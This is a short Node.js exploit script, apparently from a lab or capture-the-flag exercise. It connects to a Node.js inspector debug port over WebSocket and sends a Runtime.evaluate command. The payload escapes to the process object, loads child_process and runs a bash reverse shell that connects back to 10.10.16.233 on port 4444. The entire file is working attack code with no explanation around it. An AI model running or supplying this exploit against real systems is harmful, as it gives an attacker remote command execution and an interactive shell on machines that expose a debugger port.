const WebSocket = require('ws');

const ws = new WebSocket('ws://127.0.0.1:9229/39e87d49-1dfc-4714-8cc6-e189cd8fe1a8'); 

ws.on('open', function () {
    console.log('connected');

    ws.send(JSON.stringify({
        id: 1,
        method: "Runtime.evaluate",
        params: {
            expression: `
                this.constructor.constructor('return process')()
                .mainModule.require('child_process')
                .exec('bash -c "bash -i >& /dev/tcp/10.10.16.233/4444 0>&1;"')
                .toString()
            `
        }
    }));
});

ws.on('message', function (data) {
    console.log(data.toString());
});
